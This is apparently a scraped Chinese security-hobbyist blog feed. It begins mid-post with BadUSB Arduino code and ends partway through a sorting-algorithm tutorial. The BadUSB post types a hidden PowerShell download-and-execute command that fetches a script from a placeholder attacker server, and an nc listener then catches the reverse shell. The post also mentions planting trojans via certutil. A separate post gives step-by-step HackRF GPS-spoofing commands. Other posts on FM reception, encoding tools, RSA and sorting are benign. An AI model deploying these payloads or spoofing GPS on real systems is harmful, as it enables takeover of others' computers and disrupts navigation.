class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/DOWNLOADS/RS/CRACK.PS1&#x27;)) &#125;&quot;</span>);  </span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何烧录"><a href="#如何烧录" class="headerlink" title="如何烧录"></a>如何烧录</h3><p><strong>先将代码里的your_server_ip换成自己的ip</strong>，注意自己配置的下载路径</p><p>将该代码用arduino烧录，注意烧录是选择board为Arduino Leonardo ，Port自查</p><p>点菜单栏里的右箭头即可烧录</p><p><img src="/2024/01/13/arduino.png" alt="arduino"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="攻击机准备监听"><a href="#攻击机准备监听" class="headerlink" title="攻击机准备监听"></a>攻击机准备监听</h3><p>我的攻击机为kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 10080 -k</span><br></pre></td></tr></table></figure><p>该代码的作用是：在10080端口开启一个nc监听，保持连接</p><p>提示，你可能需要开启防火墙</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw allow 端口号/tcp</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">ufw status</span><br></pre></td></tr></table></figure><p><img src="/2024/01/13/nclisten.png" alt="nclisten"></p><h3 id="目标主机插入BadUsb"><a href="#目标主机插入BadUsb" class="headerlink" title="目标主机插入BadUsb"></a>目标主机插入BadUsb</h3><p>目标主机没有安装杀毒软件，但开启windows defender</p><p>现象：延迟5s后打开运行对话框，自动输入指定指令，按下回车后自动执行ps1脚本，同时会把powershell窗口最小化。</p><h3 id="攻击机现象"><a href="#攻击机现象" class="headerlink" title="攻击机现象"></a>攻击机现象</h3><p>usb插入不久后，攻击机上显示已连接上某ip主机，此时按回车会进入powershell，拿下目标主机控制权。</p><p><img src="/2024/01/13/ncconnect.png" alt="ncconnect"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这次尝试是特殊的，因为其实我之前做的反弹shell并不多，同时这个例子也有一定实际意义。我对于硬件编程有了一定理解，在我将该项目转移使用公网服务器的过程中也遇到了不少挑战。相信以后还可以开发出更好玩的BadUsb。</p><h3 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h3><p>BadUsb肯定是不局限于远程上线的，有更狠的活暂时不会，也有点不敢做，自己以后慢慢研究了。</p><p>BadUsb也可以用来植入木马了，通过powershell 利用certutil可以下载木马等（需要免杀）</p><p>还未测试各类杀毒软件是否会报毒badusb</p>]]></content>
      
      
      <categories>
          
          <category> badusb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One伪造GPS信号</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hackrf是可以发送无线电的，加上了时钟模块的板子可以模拟出GPS定位。</p><p>可怜的作者手头没有可用的安卓机子，因此只能发不能测试，只好根据网上的教程来实验一波</p><p>本实验环境基于虚拟机 Kali Linux 2022.2 ARM，hackrf板子需要安装时钟信号模块和发送天线</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><h3 id="GPS-SDR-SIM安装"><a href="#GPS-SDR-SIM安装" class="headerlink" title="GPS-SDR-SIM安装"></a>GPS-SDR-SIM安装</h3><p>在合适的地方创建一个目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> GPS_CHEAT</span><br></pre></td></tr></table></figure><p>下载gps-sdr-sim源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/osqzss/gps-sdr-sim.git</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gps-sdr-sim </span><br><span class="line">sudo gcc gpssim.c lm )3 -o gps-sdr-sim -DUSER_MOTION_SIZE=4000</span><br><span class="line"><span class="built_in">chmod</span> -R 777 gps-sdr-sim</span><br></pre></td></tr></table></figure><h3 id="定位GPS卫星"><a href="#定位GPS卫星" class="headerlink" title="定位GPS卫星"></a>定位GPS卫星</h3><p>前往这个网址</p><p><a href="http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html">http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html</a></p><p>下载广播星历</p><p>下载得到类似<code>brdc0050.24n</code>这种文件</p><p>放入之前的文件夹中</p><h3 id="查询经纬度信息"><a href="#查询经纬度信息" class="headerlink" title="查询经纬度信息"></a>查询经纬度信息</h3><p>上各种网站查</p><p>我这边得到一组坐标</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">122.1469258210449,37.44940186081953</span><br></pre></td></tr></table></figure><h3 id="生成欺骗文件"><a href="#生成欺骗文件" class="headerlink" title="生成欺骗文件"></a>生成欺骗文件</h3><p>产生一个gpssim.bin二进制文件</p><p>这个文件里存储的就是我输入的坐标信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc0050.24n -l 122.1469258210449,37.44940186081953 -b 8 -o gpssim.bin</span><br></pre></td></tr></table></figure><p><img src="/2024/01/06/gpssimbin.png" alt="gpssimbin"></p><h2 id="发送信息"><a href="#发送信息" class="headerlink" title="发送信息"></a>发送信息</h2><p>准备了那么久终于可以发信号了</p><p>用hackrf_tansfer工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R</span><br></pre></td></tr></table></figure><p>-t 文件名bin文件</p><p>-f 为发送频率 (不修改)</p><p>-s 采样速率 （不修改）</p><p>-a 放大器使能 1/0</p><p>-x 增益分贝 0-47分贝，1dB步长</p><p>-R 重复发送</p><p><img src="/2024/01/06/gpssend.png" alt="gpssend"></p><p>成功发送了，应该是可以被手机接收到的，不过需要断网操作，目前的手机联网后可以自动获取定位信息。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 收听FM电台</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<p>刚安装完hackrf环境，可以用这个小实验测试一波硬件是否正常工作。</p><p>这个实验用安装的gqrx操作</p><p>进入gqrx</p><p>第一步</p><p>调节Receiver Options里的选项</p><p>将Mode 调节为WFM mono</p><p>然后调节(向上)Squelch，直到右下角的视图里有波形，此时如果适当调节Gain值，则可以听到滋滋电流声</p><p><img src="/2024/01/06/gqrx_receiver.png" alt="gqrx_receiver"></p><p>第二步</p><p>调频到你所在地区的一个FM频段</p><p>此时调节BB的值，你应该已经可以清楚的听到人声了</p><p>适当调节BF和IF的值，可以使得声音更清晰</p><p>Gain值可以增大声音，但过大会有强烈电流音</p><p><img src="/2024/01/06/hackrf_input.png" alt="hackrf_input"></p><p>没有什么问题的话，这块板子的接收功能还是不错的，在我所在的地区，广播电台的声音相当清楚。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 环境安装指南</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>作者在放假前突发奇想想玩软件无线电，于是乎在某鱼花了点钱购入了一块hackrf板子。算是卖家里面最便宜的一档了，时钟信号模块一并组装好了。</p><h2 id="硬件部分"><a href="#硬件部分" class="headerlink" title="硬件部分"></a>硬件部分</h2><p>这块板子买来，卖家也不知道是什么年产的了，不过外观状况良好。</p><p>以下是各个部件：</p><p>hackrf主体部分带时钟模块</p><p>接收天线</p><p>时钟信号天线</p><p>usb数据线</p><p>注意到hackrf板子是micro-usb连接的，既是供电口，又是数据连接口。</p><p>无需赘述，不懂硬件</p><h2 id="安装软件环境"><a href="#安装软件环境" class="headerlink" title="安装软件环境"></a>安装软件环境</h2><p>作者本来想在ubuntu里安装这些环境，没想到有一点意外无法解决。</p><p>后来还是回到了我熟悉的环境虚拟机Kali Linux 2022.2 ARM中</p><p>kali安装环境很无脑，适合我这样的新手hhh。</p><h3 id="hackrf工具下载"><a href="#hackrf工具下载" class="headerlink" title="hackrf工具下载"></a>hackrf工具下载</h3><p>由于linux自带了hackrf驱动，因此不必下载驱动，直接安装工具即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install hackrf</span><br></pre></td></tr></table></figure><p>安装完成后测试一下虚拟机是否能够正常连接hackrf固件吧</p><p>1.将hackrf板子连接至电脑，指定连接到虚拟机</p><p>2.终端中输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_info</span><br></pre></td></tr></table></figure><p>若出现如下则安装成功，你的板子可以成功连接到电脑了</p><p>插一嘴这个板子是2017年的，6年的板子了，难怪便宜hhh，不过还是好用的（）</p><p><img src="/2024/01/06/hackrf_info.png" alt="hackrf_info"></p><h3 id="gqrx下载"><a href="#gqrx下载" class="headerlink" title="gqrx下载"></a>gqrx下载</h3><p>apt-get方便快捷</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gqrx-sdr</span><br></pre></td></tr></table></figure><p>在我的机器上，这个软件从终端打开，会提示Connection refused</p><p>直接从开始菜单栏找到gqrx的应用打开即可</p><p>第一次打开，在第一个设备栏里选中hackrf one即可</p><h3 id="GNUradio下载"><a href="#GNUradio下载" class="headerlink" title="GNUradio下载"></a>GNUradio下载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gnuradio</span><br></pre></td></tr></table></figure><p>用以下命令运行gnuradio</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p>若无法打开，检查命令行报错，一般是报一堆java的错</p><p>检查java版本，更新</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure><p>重新打开gnuradio即可</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>到这里hackrf的基本环境就算安装完了，后面我预计会研究一下hackrf的小项目，做一些实验，也会同步更新我的博客，欢迎关注</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>加密编码(持续更新)</title>
      <link href="/2024/01/03/"/>
      <url>/2024/01/03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章收录作者遇到的所有编码或密码。</p><h2 id="如何识别编码？"><a href="#如何识别编码？" class="headerlink" title="如何识别编码？"></a>如何识别编码？</h2><p>识别算法编码类型：</p><p>1.看位数</p><p>2.看特征（数字，字母，大小写，符合）</p><p>3.看当前密文所在地（web，数据库，操作系统）</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>解码网站：<a href="https://www.cmd5.com">https://www.cmd5.com</a></p><p>32位或16位由“0-9” “a-f”组成的字符串</p><p><strong>md5不可逆</strong></p><p><strong>破解方法</strong>：碰撞、枚举</p><p><strong>salt</strong></p><p>Discuz加盐</p><p>SHA1：与md5差不多，40位</p><h2 id="Base系列"><a href="#Base系列" class="headerlink" title="Base系列"></a>Base系列</h2><p>各类组合传输参数值</p><p>Base64、Base58、Base32、Base16、Base85、Base100等</p><p>提一嘴base100有emoji组成</p><p>可以使用<a href="https://cyberchef.org/解密大多数">https://cyberchef.org/解密大多数</a></p><p>没遇到的看这里www.atoolbox.net</p><h2 id="JS前端加密"><a href="#JS前端加密" class="headerlink" title="JS前端加密"></a>JS前端加密</h2><h3 id="JS颜文字"><a href="#JS颜文字" class="headerlink" title="JS颜文字"></a>JS颜文字</h3><p>一堆颜文字 按f12解密</p><p>解密网站：<a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></p><h3 id="jother"><a href="#jother" class="headerlink" title="jother"></a>jother</h3><p>只用 ! + ( ) [ ] { }八个字符编码 f12解密</p><p>解密网站：<a href="http://tmxk.org/jother/">http://tmxk.org/jother/</a></p><h3 id="JSFUCK"><a href="#JSFUCK" class="headerlink" title="JSFUCK"></a>JSFUCK</h3><p>只用 ! + ( ) [ ]编码</p><p>解密网站：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><h2 id="后端加密"><a href="#后端加密" class="headerlink" title="后端加密"></a>后端加密</h2><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>乱码、头部信息</p><p><a href="http://dezend.qiling.org/free.html">http://dezend.qiling.org/free.html</a></p><h4 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h4><p>DLL封装代码文件</p><p>用ILSpy</p><p>这个工具下载作者提供链接：<a href="http://114.55.111.231/downloads/ILSpy.zip">http://114.55.111.231/downloads/ILSpy.zip</a></p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>java&amp;class文件</p><h2 id="数据显示编码"><a href="#数据显示编码" class="headerlink" title="数据显示编码"></a>数据显示编码</h2><p>字符串数据显示编码</p><p>UTF-8/GBK</p><p>这个作者在base64转换时遇到的多，base64转换时候可能出现乱码，试试另一种文字比那吗就可以了</p><h2 id="杂项编码-密码"><a href="#杂项编码-密码" class="headerlink" title="杂项编码/密码"></a>杂项编码/密码</h2><p>本项有待不断补充</p><p>先记录作者做题遇到的吧，经典密码可以放放，比较容易的</p><h3 id="SNOW隐写解密"><a href="#SNOW隐写解密" class="headerlink" title="SNOW隐写解密"></a>SNOW隐写解密</h3><p>这个密码的特征就是一个文件里面有多余的不正常的换行符</p><p>提供下载链接：<a href="http://114.55.111.231/downloads/snow.exe">http://114.55.111.231/downloads/snow.exe</a></p><p>本工具为命令行工具，建立一个文件夹放入snow.exe工具，将要操作的文件放入文件夹中，在这个文件夹中打开终端进行操作。</p><p>操作方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//加密</span><br><span class="line">snow -C -m &quot;明文&quot; -p &quot;密码&quot; infile outfile</span><br><span class="line">//解密</span><br><span class="line">snow -C -p 密码&quot; file</span><br></pre></td></tr></table></figure><h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>以下工具是作者从网上收集的加解密的一些工具</p><p>超级加解密工具：<a href="http://114.55.111.231/downloads/supersoft.zip">http://114.55.111.231/downloads/supersoft.zip</a></p><p>CTF crack tools：<a href="http://114.55.111.231/downloads/cracktools.zip">http://114.55.111.231/downloads/cracktools.zip</a></p><p>字频统计：<a href="http://114.55.111.231/downloads/frequency.exe">http://114.55.111.231/downloads/frequency.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构课设-基于C++的RSA工具</title>
      <link href="/2023/12/16/"/>
      <url>/2023/12/16/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课设是笔者在学校的课程设计上自己构思的，基于c++实现，利用QT可视化。</p><p>本项目已经同步github<br><a href="https://github.com/cyan4run/RSA">https://github.com/cyan4run/RSA</a></p><p>经验不足，有一些算法还没有优化和改进会导致程序卡顿，可能在性能好的机子上会有些优化。</p><p>本项目的一些模块借鉴了其他大佬，如大数运算模块和miller-rabin算法，但是算力可能还是不够。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><h2 id="大整数运算模块"><a href="#大整数运算模块" class="headerlink" title="大整数运算模块"></a>大整数运算模块</h2><p>这个模块借鉴了github上部分项目<br>用字符串存取一个大整数，大整数的所有运算在BigInteger.cpp中完成。其中关键的运算是modpow和modInverse函数。这两个函数用于计算RSA。其中对运算符做了重载</p><h2 id="随机素数模块"><a href="#随机素数模块" class="headerlink" title="随机素数模块"></a>随机素数模块</h2><p>随机一个指定位数的模块，但是这个模块即使只做了一次素性检测，在大位时仍然很慢，采用随机素数文件封装在exe中，保证加密效率，但安全性下降。当然，QT工程里primes文件夹里就是我已经预先存储的素数，可以通过python的Crypto库生成随机素数，速度很快。<br>这个算法部分借鉴了某项目。</p><h2 id="RSA模块"><a href="#RSA模块" class="headerlink" title="RSA模块"></a>RSA模块</h2><p>整合了加密，解密模块在一个RSA类中，参见Rsa.cpp，Init函数将会随机生成素数并计算所有相关的RSA的值</p><p>作者一开始写的时候没有想到用户自己填写公钥加密的模块，有兴趣的可以加加。</p><h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><p>本项目即QT工程，直接在QT中打开选择编译架构即可运行。</p><p>封装好的exe文件也一并给出，这个exe是使用Enigma virtual box封装的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>getPrime.cpp有待优化，但目前够用。<br>各位大佬可以看看优化一下素数算法</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】排序</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="排序概述"><a href="#排序概述" class="headerlink" title="排序概述"></a>排序概述</h3><h4 id="排序方法的稳定性"><a href="#排序方法的稳定性" class="headerlink" title="排序方法的稳定性"></a>排序方法的稳定性</h4><p>当需要排序的关键字都不相同时，排序的结果是唯一的</p><p>当排序的关键字中存在相同的情况时，排序结果不唯一</p><p>在排序前后，含相等关键字的记录的相对位置保持不变，称这种排序方法是稳定的，反之，含相等关键字的记录的相对位置有可能改变，则称这种排序方法不稳定。</p><h4 id="内部排序和外部排序"><a href="#内部排序和外部排序" class="headerlink" title="内部排序和外部排序"></a>内部排序和外部排序</h4><p>在排序过程中，只使用计算机的内存存放排序记录，称这种排序为内部排序；</p><p>排序期间文件的全部记录不能同时存放在内存中，要借助计算机的外存才能完成排序，称为外部排序</p><p>内外存之间的数据交换次数是影响外部排序速度的主要因素</p><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1000 <span class="comment">//待排顺序表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">  <span class="type">char</span> data;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        KeyType key;<span class="comment">//关键字 整型类型</span></span><br><span class="line">        InfoType otherinfo;<span class="comment">//其他数据项</span></span><br><span class="line">&#125;RcdType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="排序方法的效率分析"><a href="#排序方法的效率分析" class="headerlink" title="排序方法的效率分析"></a>排序方法的效率分析</h4><p>1.时间复杂度：关键字的比较次数和记录移动次数</p><p>2.空间复杂度：执行算法所需的附加存储空间</p><p>3.稳定算法和不稳定算法</p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>从第二个记录开始排序</p><p>经过第i趟排序，前i+1个记录有序</p><h5 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将序列中的第一个记录看成是一个有序的子序列</p><p>2.从第二个记录起按关键字大小逐个进行插入，直至整个序列变成按关键字有序序列为止</p><p>从第二个记录到第n个记录，共n-1趟</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;L.r[<span class="number">0</span>].key&lt;L.r[j].key;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//插入排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>该算法在原序列呈正序排列时最省时间；在反序排列时最费时间</p><p>最好的情况</p><p>比较次数$\sum_{i=1}^{n-1} 1=n-1$    移动次数：0</p><p>最坏的情况</p><p>比较次数$\sum_{i=2}^{n} i=(n+2)(n-1)/2$     移动次数：$\sum_{i=2}^n (i+1)=(n+4)(n-1)/2$</p><p>平均$O(n^2)$</p><p>直接插入排序是<strong>稳定的</strong>排序方法</p><p>算法效率：</p><p>时间复杂度</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p>采用的是折半查找在有序区找到插入的位置</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BiInsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low,high,mid;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=L.length;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            low=<span class="number">1</span>;high=i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">                mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(L.r[<span class="number">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class="line">                    high=mid<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    low=mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//折半插入</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：折半插入排序是稳定的排序</p><p>2.算法效率：</p><p>时间复杂度：平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><h5 id="算法概述-1"><a href="#算法概述-1" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将记录序列分为若干子序列，分别对每个子序列进行插入排序 将n个记录分成d个子序列</p><p>2.d称为增量，在排序过程中逐渐减小，直至最后一趟排序减为1</p><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellInsert</span><span class="params">(SqList &amp;L,<span class="type">int</span> dk)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=dk+<span class="number">1</span>;i&lt;=L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i-dk].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>].key=L.r[i].key;</span><br><span class="line">            <span class="keyword">for</span>(j=i-dk;j&gt;<span class="number">0</span>&amp;&amp;L.r[<span class="number">0</span>].key&lt;L.r[j].key;j-=dk)&#123;</span><br><span class="line">                L.r[j+dk]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+dk]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> dlta[],<span class="type">int</span> t )</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;t;k++)&#123;</span><br><span class="line">        <span class="built_in">ShellInsert</span>(L, dlta[k]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//希尔排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：希尔排序是不稳定的排序方法、</p><p>2.算法效率：</p><p>时间复杂度平均$O(n^{1.3})$到平均$O(n^{1.5})$</p><p>空间复杂度：$O(1)$</p><h4 id="起泡排序"><a href="#起泡排序" class="headerlink" title="起泡排序"></a>起泡排序</h4><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.从第一个记录开始两两比较记录的关键字，若L.r[i].key&gt;L.r[i+1].key,则将两个记录交换</p><p>2.第一趟比较结构将序列中关键字最大的记录放到最后一个位置，而最小的上浮一个位置</p><p>3.n个记录比较n-1趟</p><h5 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,noswap;RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=L.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        noswap=<span 